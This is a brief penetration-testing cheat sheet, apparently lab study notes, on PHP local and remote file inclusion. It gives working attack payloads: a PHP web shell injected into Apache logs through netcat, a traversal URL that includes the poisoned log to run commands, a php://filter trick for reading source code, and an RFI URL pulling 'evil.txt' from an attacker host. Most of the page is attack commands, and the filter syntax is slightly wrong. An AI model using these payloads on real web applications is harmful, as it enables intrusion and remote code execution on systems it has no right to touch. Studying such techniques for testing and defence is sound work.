# File inclusions (LFI & RFI)

> A file inclusion vulnerability is a type of web vulnerability that is most commonly found to affect web applications that rely on a scripting run time. This issue is caused when an application builds a path to executable code using an attacker-controlled variable in a way that allows the attacker to control which file is executed at run time.  
>
> -- <cite>[Wikipedia](https://en.wikipedia.org/wiki/File_inclusion_vulnerability)</cite>

* [GitHub - swisskyrepo/PayloadsAllTheThings: A list of useful payloads and bypass for Web Application Security and Pentest/CTF](https://github.com/swisskyrepo/PayloadsAllTheThings)

## PHP settings

[PHP Sicherheit: Local & Remote File Inclusion - Webmaster Tipps](https://www.webmaster-tipps.de/php-sicherheit-local-file-inclusion-und-remote-file-inclusion/)
* allow_url_include
* allow_url_fopen

## String termination

Example: `include("path/ + $GET_['FILE] + ".php);`  
If we want to get rid of the enforced `.php` extension, we must terminate the string before.

### Null byte poisoning

Terminate string with null byte (PHP < 5.3.4)  
-> %00  
e.g. `filename.txt%00`  

### Get parameter 

`filename.txt?bla=`

## Local File Inclusion (LFI)

### Poisoning log files

```bash
nc -nv 10.11.1.35 80
```

```php
<?php echo shell_exec($_GET['cmd']); ?>
```
-> May gets writting into log files

Execute a cmd:
```
http://10.11.1.35/addguestbook.php?name=a&comment=b&cmd=ipconfig&LANG=../../../../../ ../../xampp/apache/logs/access.log%00
```

### Bypass php execution

Use php filter and base64 encoding to bypass php execution and retrieve the source code.
```
php://filter/convert.base64encode/resource=<file>
```

## Remote File Inclusion (RFI)

```
http://10.11.1.35/addguestbook.php?name=a&comment=b&LANG=http://10.11.0.5/evil.txt%00
```
